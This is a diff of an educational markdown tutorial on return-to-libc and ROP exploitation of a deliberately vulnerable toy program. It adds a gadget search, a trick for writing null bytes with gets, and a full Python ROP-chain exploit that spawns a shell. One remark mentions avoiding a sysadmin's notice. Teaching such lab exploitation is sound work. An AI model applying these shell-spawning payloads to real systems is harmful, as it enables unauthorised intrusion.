@@ -7,7 +7,10 @@ https://stackoverflow.com/questions/51919876/retrieving-offsets-strings-and-virt
 https://stackoverflow.com/questions/1685483/how-can-i-examine-contents-of-a-data-section-of-an-elf-file-on-linux \
 https://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization \
 https://en.wikipedia.org/wiki/Address_space_layout_randomization \
-https://www.ret2rop.com/2018/08/return-to-libc.html
+https://www.ret2rop.com/2018/08/return-to-libc.html \
+https://github.com/JonathanSalwan/ROPgadget \
+https://stackoverflow.com/questions/14370972/how-to-attach-a-process-in-gdb \
+http://ropshell.com/peda/Linux_Interactive_Exploit_Development_with_GDB_and_PEDA_Slides.pdf
 
 When a function is called, a return address is saved in the stack so the
 program knows where to take instructions from after the function exits, by
@@ -67,7 +70,7 @@ the only difference is that we would use some command line trick to
 redirect the desired input to the program. The concepts used for the actual
 ROP wouldn't change.
 
-## The Compilation
+## The Compilation Throughout the ROP material
 
 Just like in `first_buffer_overflow.c`, we will compile with some flags
 to allow us to exploit the program easily. We will introduce some new
@@ -132,7 +135,7 @@ buffer is from the return address.
 Mind that we are not going to overwrite the return address from `main`,
 since the buffer is actually in the `password_is_correct` stack frame.
 
-### Getting r00t
+### Getting Our First Shell With ROP
 
 First, launch gdb with `gdb -q rip`. We will use the `info functions`
 command in `gdb` to search for `impossible_shell`.
@@ -209,7 +212,7 @@ order is backwards. Yours is probably too (most are nowadays)
 Running any of the above commands (with the proper addresses)
 should grant you a shell!
 
-### Getting Shell in the Wild
+### Getting Shells in the Wild
 
 Although we managed to get the shell, our methodology could be improved
 to work in other scenarios.
@@ -302,4 +305,188 @@ it will be used as an argument to `system`:
 ./rip `python3 -c "__import__('sys').stdout.buffer.write(b'A'*0x18 + b'BBBB' + b'\x50\x68\xe3\xf7' + b'CCCC' + b'\xc8\x97\xf5\xf7')"`
 ```
 
-## Dealing With a 0x00 in the Addresses
+### NULL bytes, Gadgets and Chains
+
+In my machine, the last procedure was really straight forward, but
+what if one of these addresses contained a **null byte** (0x00)?
+
+Since we are giving our input as a string, a null byte would
+mark the end of the string and thus making the rest of our
+input to be ignored.
+
+For example, in my machine, the address of the function `exit`
+in `libc` is `0xf7e2a800`, and in an attempt to make our shell
+exit smoothly (which is a good practice, to avoid catching the
+attention of a sysadmin monitoring crashing programs for example),
+i tried the following:
+
+```
+b'A'*0x18 + b'BBBB' + b'\x50\x68\xe3\xf7' + b'\x00\xa8\xe2\xf7' + b'\xc8\x97\xf5\xf7'
+```
+
+But we get a `Segmentation Fault` for that, since after the null
+byte (`\x00`) the input is no longer processed, and without the
+address of "/bin/sh" (\xc8\x97\xf5\xf7) we can't get a shell.
+
+So how do we write a null byte when we can't put it in our input?
+Make something else write it for us! To do so we can use `gets`
+command!
+
+`gets` write reads a line from our input into a buffer (address we
+give to it) until either a terminating newline or EOF, which it
+replaces with a null byte ('\0'). If we call `gets` and input
+nothing, a null byte will be written to the address we give it.
+
+Obs .: Before doing so, i recommend writing the exploit in a file,
+since things can get complicated really easily when writing payloads
+directly to the terminal. 
+
+Since we want to call `gets` and then `system` we are building a
+**ROP chain**. Chains are calls to different functions, connected
+together by **gadgets**. gadgets are small pieces of code that end
+with the `ret` command, that allow us to redirect the excution flow
+again and again by giving addresses to the many `ret` commands
+that glue our exploit together. gadgets usually have `pop` commands
+to help us manipulate the stack.
+
+You could just look around for gadgets that might be interesting
+to use (`objdump` and `grep -B` are pretty helpful), or you could
+let a tool like ROPgadget find them for you.
+
+To recap, our exploit should:
+
+1. Call `gets` and write \x00 to a byte address we will pass as
+an argument
+
+2. Call `system` with "/bin/sh" as argument
+
+3. Call exit, leaving the program with no `Segmentation Fault`
+
+first, the `gets`:
+
+```
+#fill buffer, EBP, go to gets, return address, address to write null
+b'A'*0x18 + b'BBBB' + gets +  return address  + address to nullify
+```
+
+In `return address` we could put a `pop; ret` gadget. This would
+get rid of `address to nullify` and load whatever comes after it to
+EIP.
+
+We have two binaries in which we can look for gadgets here: `rip`
+and the 32 bit `libc` library.
+
+With `objdump -D -M intel-mnemonic rip | grep -B 1 ret | grep -A 1 pop`
+we get theses results:
+
+```
+ 804832d:	5b                   	pop    ebx
+ 804832e:	c3                   	ret    
+--
+ 80485fb:	5d                   	pop    ebp
+ 80485fc:	c3                   	ret    
+--
+ 8048616:	5b                   	pop    ebx
+ 8048617:	c3                   	ret
+```
+
+Since we keep overriding EBP anyway, let's just use
+`0x80485fb` (`pop ebp; ret`). So the beggining of our
+payload now looks like this:
+
+```
+b'A'*0x18 + b'BBBB' + gets + pop;ret + address to nullify
+```
+
+Now for the `system` part we just add:
+
+```
+system + exit (with a non zero value instead of the null byte) + "/bin/sh" address
+```
+
+To get `exit` we can just do `print exit` in `gdb` after
+running the program. To get where the future null byte of
+`exit` will be at, we just get the number of bytes
+between it and the first EBP byte (20 bytes) and add it
+to the value of EBP at `passsword_is_correct`:
+
+```
+(gdb) p $ebp
+$9 = (void *) 0xffffd208
+(gdb) p $ebp + 20
+$10 = (void *) 0xffffd21c
+```
+
+resulting in:
+
+```
+b'A'*0x18 + b'BBBB' + gets + pop;ret + address to nullify + system + exit (with a non zero value instead of the null byte) + "/bin/sh" address
+```
+
+And changing everything to the actual addresses:
+
+```
+#fill buffer,  EBP,         gets         ,         pop;ret ,     address to nullify,        system,      exit (with \xBB instead of \x00),     "bin/sh"
+b'A'*0x18 + b'BBBB' + b'\xc0\xaf\xe5\xf7' + b'\xfb\x85\x04\x08' + b'\x2c\xd2\xff\xff' + b'\x50\x68\xe3\xf7' + b'\xBB\xa8\xe2\xf7' + b'\xc8\x97\xf5\xf7'
+```
+
+Or, in a python3 script (exploit.py):
+
+```
+import sys
+import struct
+import os
+
+payload = b'A' * 0x18
+payload += b'BBBB'
+payload += struct.pack("I", 0xf7e5afc0) # gets
+payload += struct.pack("I", 0x080485fb) # pop ebp;ret
+payload += struct.pack("I", 0xffffd218 + 20) # address to nullify
+payload += struct.pack("I", 0xf7e36850) # system
+payload += struct.pack("I", 0xf7e2a8BB) # exit, with 'BB' instead of null byte
+payload += struct.pack("I", 0xf7f597c8) # address to /bin/sh
+
+sys.stdout.buffer.write(payload)
+
+```
+
+Run it by using `./rip $( python3 exploit.py )`.
+
+In `gdb`, this payload gives me a gracefull shutdown when i
+exit the shell. However, when running it normally, i get
+a `Segmentation Fault` on exit.
+
+Although we can manipulate some settings to make the `gdb`
+and the actual environment we will exploit similar, it is
+not always enough. A solution to this is to investigate
+in the environment we will exploit by attaching `gdb` to
+it.
+
+First, run `sudo sysctl -w kernel.yama.ptrace_scope=0`,
+this will allow us to attach `gdb` to already running
+processes.
+
+If you run `./rip $( python3 exploit.py )` and don't
+type anything, you can go to another window and type
+`gdb rip` and press `TAB`. This will autocomplete the
+command by inserting the PID number of `rip`, allowing
+you to start `gdb` attach to the already running process!
+
+If we follow the program's execution until the `ret` that
+loads `exit` address to EIP, we can see that (before `ret` is
+actually executed) with `x/10x $esp` that the address of exit,
+`0xf7e2a8BB`, is at `0xffffd27c`.
+
+Since in little-debian the first byte of this address is
+the first to appear in memory, `0xffffd27c` is the address
+of the `0xbb` byte we want to nullify.
+
+By changing the address to nullify in `exploit.py` from
+`0xffffd218` to `0xffffd27c`, we get the shell and a
+gracefull exit:
+
+```
+./rip $( python3 exploit.py )
+
+$ exit
+```
